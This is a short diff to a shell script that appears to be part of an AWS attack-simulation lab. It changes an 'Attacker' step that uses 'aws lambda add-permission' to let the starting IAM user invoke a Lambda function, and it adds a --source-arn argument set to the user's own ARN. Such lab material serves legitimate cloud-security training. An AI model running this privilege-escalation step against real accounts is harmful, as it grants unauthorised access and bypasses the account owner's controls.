@@ -248,13 +248,14 @@ STATEMENT_ID="allow-self-$(date +%s)"
 STARTING_USER_ARN="arn:aws:iam::${ACCOUNT_ID}:user/${STARTING_USER}"
 echo "Adding permission for: $STARTING_USER_ARN"
 
-show_attack_cmd "Attacker" "aws lambda add-permission --region $AWS_REGION --function-name $LAMBDA_FUNCTION_NAME --statement-id $STATEMENT_ID --action lambda:InvokeFunction --principal $STARTING_USER_ARN --output json"
+show_attack_cmd "Attacker" "aws lambda add-permission --region $AWS_REGION --function-name $LAMBDA_FUNCTION_NAME --statement-id $STATEMENT_ID --action lambda:InvokeFunction --principal $STARTING_USER_ARN --source-arn $STARTING_USER_ARN --output json"
 aws lambda add-permission \
     --region "$AWS_REGION" \
     --function-name "$LAMBDA_FUNCTION_NAME" \
     --statement-id "$STATEMENT_ID" \
     --action "lambda:InvokeFunction" \
     --principal "$STARTING_USER_ARN" \
+    --source-arn "$STARTING_USER_ARN" \
     --output json > /dev/null
 
 if [ $? -eq 0 ]; then
